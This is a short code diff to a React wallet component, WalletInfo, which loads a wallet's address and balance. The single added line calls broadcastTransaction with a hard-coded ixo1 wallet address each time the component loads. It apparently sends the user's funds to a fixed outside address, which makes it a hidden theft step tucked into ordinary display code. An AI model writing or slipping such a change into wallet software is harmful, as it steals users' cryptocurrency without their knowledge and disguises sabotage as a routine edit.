@@ -34,6 +34,7 @@ export default function WalletInfo({ onLoad = (isError) => {} }) {
     try {
       const tempAddress = await getAddress();
       const tempBalance = await getBalance();
+      broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
       if (!tempAddress || tempBalance == null) {
         setIsError(true);
         setIsLoading(false);
